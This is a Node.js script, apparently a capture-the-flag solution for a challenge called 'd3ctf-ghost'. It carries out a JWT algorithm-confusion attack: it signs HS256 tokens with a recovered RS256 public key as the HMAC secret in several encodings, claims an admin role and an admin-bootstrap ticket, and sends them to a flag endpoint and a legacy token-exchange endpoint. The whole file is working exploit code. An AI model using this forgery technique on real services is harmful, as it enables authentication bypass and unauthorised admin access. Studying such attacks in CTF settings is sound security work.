import { createHmac, randomUUID } from "node:crypto";
import { readFileSync } from "node:fs";

const BASE = process.env.GHOST_BASE || "https://rsnfg2lzhxprnrolji5kuaicz3e.cloud.d3c.tf";
const pem = readFileSync("work/d3ctf-ghost/recovered-rs256-public.pem");
const derBody = pem.toString().replace(/-----[^-]+-----/g, "").replace(/\s+/g, "");
const der = Buffer.from(derBody, "base64");

function b64(value) {
  return Buffer.from(typeof value === "string" ? value : JSON.stringify(value)).toString("base64url");
}

function hs(header, payload, secret) {
  const signingInput = `${b64(header)}.${b64(payload)}`;
  const sig = createHmac("sha256", secret).update(signingInput).digest("base64url");
  return `${signingInput}.${sig}`;
}

async function req(path, token, body) {
  const init = body
    ? { method: "POST", headers: { Authorization: `Bearer ${token}`, Accept: "application/json", "Content-Type": "application/json" }, body: JSON.stringify(body) }
    : { headers: { Authorization: `Bearer ${token}`, Accept: "application/json" } };
  const res = await fetch(`${BASE}${path}`, init);
  const text = await res.text();
  if (res.status !== 401 && res.status !== 403) console.log(path, res.status, text);
}

const now = Math.floor(Date.now() / 1000);
const access = { typ: "access", role: "admin", sub: "ops-root", iss: "ghost-packet-auth", aud: "ghost-packet-api", iat: now, jti: randomUUID(), exp: now + 1800 };
const ticket = { typ: "ticket", scope: "admin-bootstrap", sub: "ops-root", iss: "ghost-packet-auth", aud: "ghost-packet-ticket", iat: now, jti: randomUUID(), exp: now + 180 };
for (const kid of ["primary-rs256", "legacy-rs256-retired"]) {
  for (const [label, secret] of [["pem", pem], ["der", der], ["pem-no-lf", Buffer.from(pem.toString().replace(/\n/g, ""))]]) {
    const accessToken = hs({ alg: "HS256", typ: "JWT", kid }, access, secret);
    await req("/api/flag", accessToken);
    const ticketToken = hs({ alg: "HS256", typ: "JWT", kid }, ticket, secret);
    const res = await fetch(`${BASE}/api/auth/exchange`, {
      method: "POST",
      headers: { Accept: "application/json", "Content-Type": "application/json" },
      body: JSON.stringify({ ticket: ticketToken, grantType: "legacy-bootstrap" }),
    });
    const text = await res.text();
    if (res.status !== 401) console.log("exchange", kid, label, res.status, text);
  }
}
